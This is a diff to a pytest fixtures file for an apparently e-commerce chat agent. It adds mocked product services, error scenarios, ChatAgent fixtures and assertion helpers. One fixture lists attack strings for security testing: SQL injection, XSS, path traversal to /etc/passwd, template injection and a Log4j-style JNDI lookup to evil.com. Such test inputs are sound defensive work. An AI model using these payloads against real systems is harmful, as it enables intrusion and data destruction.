@@ -6,7 +6,7 @@ This file provides:
 """
 
 import pytest
-from unittest.mock import AsyncMock
+from unittest.mock import AsyncMock, MagicMock, patch
 from datetime import datetime, timedelta, timezone
 
 # Import all factories
@@ -33,7 +33,11 @@ from tests.factories import (
 
 @pytest.fixture
 def session():
-    """Create test session."""
+    """Create test session with default configuration.
+
+    Returns:
+        Session: Domain entity with auto-generated ID and current timestamps
+    """
     return SessionFactory.create()
 
 
@@ -236,8 +240,21 @@ def mock_ai_agent():
 
 @pytest.fixture
 def mock_product_service():
-    """Create mock product service."""
-    return MockProductServiceFactory.create()
+    """Create mock product service with standard happy-path behavior.
+
+    Returns:
+        AsyncMock with search_products and get_product_by_id configured
+
+    Example:
+        mock = mock_product_service()
+        mock.search_products.return_value = [product1, product2]
+    """
+    mock = MockProductServiceFactory.create()
+    # Add standard behavior specifications
+    mock.search_products.return_value = [ProductFactory.create()]
+    mock.get_product_by_id.return_value = ProductFactory.create()
+    mock.get_product_with_variants.return_value = ProductWithVariantsFactory.create()
+    return mock
 
 
 @pytest.fixture
@@ -253,8 +270,63 @@ def mock_redis_with_session():
 
 
 @pytest.fixture
+def mock_product_service_with_errors():
+    """Mock ProductService with various error scenarios.
+
+    Use this fixture for testing error handling and resilience.
+    """
+    mock = AsyncMock()
+
+    # Network error scenario
+    mock.network_error = AsyncMock(side_effect=Exception("Network timeout"))
+
+    # Rate limiting scenario
+    mock.rate_limited = AsyncMock(side_effect=Exception("Rate limit exceeded"))
+
+    # Authentication error
+    mock.invalid_auth = AsyncMock(side_effect=Exception("Invalid API key"))
+
+    # Database error
+    mock.database_error = AsyncMock(side_effect=Exception("Database connection failed"))
+
+    # Partial failure - some methods work, others fail
+    mock.search_products = AsyncMock(side_effect=Exception("Search unavailable"))
+    mock.get_product_by_id = AsyncMock(return_value=None)  # Returns None for not found
+
+    return mock
+
+
+@pytest.fixture
+def malicious_input_samples():
+    """SQL injection, XSS attempts for security testing.
+
+    Returns:
+        List of potentially malicious input strings for security validation testing.
+    """
+    return [
+        "'; DROP TABLE users; --",
+        "<script>alert('XSS')</script>",
+        "../../etc/passwd",
+        "{{7*7}}",  # Template injection
+        "${jndi:ldap://evil.com/a}",  # Log4j style
+        "\\x00\\x01\\x02",  # Null bytes
+    ]
+
+
+@pytest.fixture
 def mock_query_analyzer():
-    """Create mock query analyzer for testing."""
+    """Create mock query analyzer for testing.
+
+    Returns:
+        MockQueryAnalyzer: Custom mock with call tracking and state management
+        capabilities for testing query analysis workflows.
+
+    Features:
+        - Call count tracking
+        - Last query/context tracking
+        - Configurable analyze mock behavior
+        - Reset functionality for test isolation
+    """
     from unittest.mock import AsyncMock
 
     class MockQueryAnalyzer:
@@ -524,6 +596,117 @@ def sample_query_intent_with_clarification():
         detected_attributes={"type": "hollow", "material": "besi", "size": "4x4"},
         conversation_turn=3,
     )
+
+
+# =============================================================================
+# Composite Fixtures
+# =============================================================================
+
+
+@pytest.fixture
+def chat_agent_with_mocked_llm():
+    """Create ChatAgent with mocked LLM calls for testing.
+
+    Returns:
+        ChatAgent instance with mocked agent.run method
+    """
+    from src.infrastructure.ai.chat_agent import ChatAgent
+
+    with patch.dict("os.environ", {"OPENAI_API_KEY": "test-key"}):
+        with patch("src.infrastructure.ai.chat_agent.Agent"):
+            with patch("src.infrastructure.ai.chat_agent.OpenAIChatModel"):
+                agent = ChatAgent()
+                agent.agent = MagicMock()
+                agent.agent.run = AsyncMock()
+                return agent
+
+
+@pytest.fixture
+def chat_agent_test_context(mock_product_service, mock_redis, product_with_variants):
+    """Complete test context for ChatAgent tests.
+
+    Provides a fully configured testing environment with all necessary mocks
+    and sample data for comprehensive ChatAgent testing.
+
+    Returns:
+        dict: Contains product_service, redis, sample_data, and agent instance
+    """
+    from src.infrastructure.ai.chat_agent import ChatAgent
+
+    with patch.dict("os.environ", {"OPENAI_API_KEY": "test-key"}):
+        with patch("src.infrastructure.ai.chat_agent.Agent"):
+            with patch("src.infrastructure.ai.chat_agent.OpenAIChatModel"):
+                return {
+                    "product_service": mock_product_service,
+                    "redis": mock_redis,
+                    "sample_data": product_with_variants,
+                    "agent": ChatAgent.create_with_fallback(),
+                }
+
+
+@pytest.fixture(
+    params=[0, 50, 100, 1000],
+    ids=["no_stock", "low_stock", "normal_stock", "high_stock"],
+)
+def product_with_stock_levels(request):
+    """Create product with parameterized stock levels for edge case testing.
+
+    Args:
+        request: Pytest request object with stock level parameter
+
+    Returns:
+        VariantInfo with specified stock quantity
+    """
+    return VariantInfoFactory.create(stock_quantity=request.param)
+
+
+@pytest.fixture
+def large_product_catalog():
+    """Generate large dataset for performance testing.
+
+    Creates 100 products with multiple variants each for testing
+    pagination, search performance, and memory handling.
+    """
+    products = []
+    for i in range(100):
+        product = ProductFactory.create(
+            product_id=f"prod-{i}",
+            product_name=f"Product {i}",
+            variant_count=5,
+        )
+        products.append(product)
+    return products
+
+
+@pytest.fixture
+def mock_assertion_helpers():
+    """Helper class for common mock assertions.
+
+    Provides utility methods for verifying mock behavior patterns
+    across different test scenarios.
+    """
+
+    class MockAssertions:
+        @staticmethod
+        def assert_called_with_retry(mock, expected_calls=3):
+            """Assert mock was called with retry logic."""
+            assert mock.call_count == expected_calls, f"Expected {expected_calls} calls, got {mock.call_count}"
+
+        @staticmethod
+        def assert_error_handled(mock_service, mock_logger=None):
+            """Assert error was properly handled."""
+            mock_service.assert_called()
+            if mock_logger:
+                mock_logger.error.assert_called()
+
+        @staticmethod
+        def assert_cached_response(mock_cache, cache_key):
+            """Assert response was cached."""
+            mock_cache.set.assert_called()
+            call_args = mock_cache.set.call_args
+            assert call_args[0][0] == cache_key
+
+    return MockAssertions()
 
 
 # =============================================================================
